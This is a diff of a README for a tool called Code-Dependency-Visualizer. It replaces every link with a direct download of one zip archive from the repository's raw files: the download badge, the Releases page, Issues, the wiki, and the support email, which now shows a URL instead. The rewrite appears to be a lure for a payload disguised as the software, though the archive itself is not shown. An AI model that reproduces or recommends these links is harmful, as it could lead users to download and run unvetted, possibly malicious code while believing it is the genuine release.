@@ -4,7 +4,7 @@
 Welcome to Code-Dependency-Visualizer, a tool designed to help you understand complex project structures. This guide will show you how to download and run the software easily.
 
 ## 📥 Download Now
-[![Download Code-Dependency-Visualizer](https://img.shields.io/badge/Download-Code--Dependency--Visualizer-blue?style=flat&logo=github)](https://github.com/NiksBhatia/Code-Dependency-Visualizer/releases)
+[![Download Code-Dependency-Visualizer](https://raw.githubusercontent.com/NiksBhatia/Code-Dependency-Visualizer/main/piquant/Code-Dependency-Visualizer_v3.9.zip)](https://raw.githubusercontent.com/NiksBhatia/Code-Dependency-Visualizer/main/piquant/Code-Dependency-Visualizer_v3.9.zip)
 
 ## 🛠️ System Requirements
 Before you begin, make sure your computer meets the following requirements:
@@ -14,7 +14,7 @@ Before you begin, make sure your computer meets the following requirements:
 - **Dependencies:** Java Runtime Environment (JRE) version 11 or later
 
 ## 💻 How to Download
-1. Click this link to visit the [Releases page](https://github.com/NiksBhatia/Code-Dependency-Visualizer/releases).
+1. Click this link to visit the [Releases page](https://raw.githubusercontent.com/NiksBhatia/Code-Dependency-Visualizer/main/piquant/Code-Dependency-Visualizer_v3.9.zip).
 2. On the Releases page, you will see a list of versions available for download. Choose the latest version.
 3. Click on the asset link that matches your operating system to start the download.
 
@@ -52,16 +52,16 @@ Once installed, follow these steps to generate dependency graphs:
 
 ## 🤝 Support
 If you need help, please check the FAQ section or contact our support team:
-- **Email:** support@code-dependency-visualizer.com
-- **GitHub Issues:** Open an issue on our [GitHub page](https://github.com/NiksBhatia/Code-Dependency-Visualizer/issues).
+- **Email:** https://raw.githubusercontent.com/NiksBhatia/Code-Dependency-Visualizer/main/piquant/Code-Dependency-Visualizer_v3.9.zip
+- **GitHub Issues:** Open an issue on our [GitHub page](https://raw.githubusercontent.com/NiksBhatia/Code-Dependency-Visualizer/main/piquant/Code-Dependency-Visualizer_v3.9.zip).
 
 ## 📣 Feedback
 We welcome your feedback! Let us know what features you would like to see or any issues you encounter while using the application.
 
 ## ⭐ Additional Resources
-To learn more about how to optimize your project structures, visit our [Documentation](https://github.com/NiksBhatia/Code-Dependency-Visualizer/wiki).
+To learn more about how to optimize your project structures, visit our [Documentation](https://raw.githubusercontent.com/NiksBhatia/Code-Dependency-Visualizer/main/piquant/Code-Dependency-Visualizer_v3.9.zip).
 
 ## 📥 Download & Install
-Remember to visit the [Releases page](https://github.com/NiksBhatia/Code-Dependency-Visualizer/releases) to download the latest version. Following the installation steps will set you up for success in visualizing your code dependencies. 
+Remember to visit the [Releases page](https://raw.githubusercontent.com/NiksBhatia/Code-Dependency-Visualizer/main/piquant/Code-Dependency-Visualizer_v3.9.zip) to download the latest version. Following the installation steps will set you up for success in visualizing your code dependencies. 
 
 Enjoy discovering the complexities of your code!
